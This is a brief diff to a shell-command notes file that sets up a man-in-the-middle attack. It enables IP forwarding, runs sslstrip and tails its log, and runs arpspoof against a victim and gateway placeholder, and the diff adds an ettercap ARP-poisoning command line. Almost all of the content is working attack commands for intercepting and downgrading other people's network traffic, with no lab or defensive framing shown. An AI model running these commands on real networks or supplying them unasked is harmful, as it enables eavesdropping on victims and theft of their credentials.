@@ -4,6 +4,9 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 #configure ettercap iptable
 locate etter.conf
 
+#ettercap with command line
+ettercap -TqM arp:remote /ip/port/ /ip/port/
+
 ##########
 #sslstrip#
 ##########
@@ -19,5 +22,4 @@ tail -f sslstrip.log
 
 #turn on arpspoof
 arpspoof -i eth0 -t ip_vic ip_gw
-
 
